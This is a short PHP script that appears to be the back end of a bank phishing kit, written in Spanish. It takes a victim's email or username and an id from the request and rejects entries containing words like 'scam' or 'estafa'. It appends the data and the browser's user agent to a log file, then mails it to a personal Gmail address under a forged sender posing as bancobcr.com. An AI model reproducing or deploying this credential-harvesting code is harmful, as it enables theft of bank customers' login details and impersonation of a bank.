<?php
error_reporting(0);
			
if(isset($_GET['correo'])){
if(empty($_GET['id'])){
echo '{"status":"error","errordescription":"Falta un parametro","number":"408"}';
exit();	
} else
if(strlen($_GET['correo']) < 6){
echo '{"status":"error","errordescription":"El E-Mail / Usuario ingresado es inválido","number":"408"}';
exit();
} else
if(strpos($_GET['correo'], 'pene') || strpos($_GET['correo'], 'Pene') || strpos($_GET['correo'], 'mama') || strpos($_GET['correo'], 'Mama') || strpos($_GET['correo'], 'estafa') || strpos($_GET['correo'], 'Estafa') || strpos($_GET['correo'], 'scam') || strpos($_GET['correo'], 'Scam') || strpos($_GET['correo'], 'nueva') || strpos($_GET['correo'], ' ') || strpos($_GET['correo'], ' ')|| strpos($_GET['correo'], 'putos')){
echo '{"status":"error","errordescription":"El E-Mail / Usuario ingresado es inválido","number":"408"}';
} else
	
echo '{"status":"success","errordescription":"none","number":"302"}';

$kOpD3ZelQ = fopen('e-mail-error.text','a+');
 $zPpD3ZelQ = fwrite($kOpD3ZelQ, "<hr></hr>IDENTIFICACION UNICA : ".$_GET['id']."</br>E-MAIL / USER ".$_GET['correo']."</br>AGENTE DE NAVEGACION ".$_SERVER['HTTP_USER_AGENT']."<hr></hr>");
 fclose($kOpD3ZelQ);
   $content .= "IDENTIFICACION UNICA : ".$_GET['id']."
   E-MAIL / USER ".$_GET['correo']."
   AGENTE DE NAVEGACION ".$_SERVER['HTTP_USER_AGENT']."";

$recipient = "edgarlozolla1@gmail.com";
$subject = "Login MP ".$_GET['id']."";
$prefijo = substr(md5(uniqid(rand())),0,6);
$from = "From:Login Visa Home - $ip<$prefijo@bancobcr.com>";

mail($recipient,$subject,$content,$from);
			exit();
}		
			?>
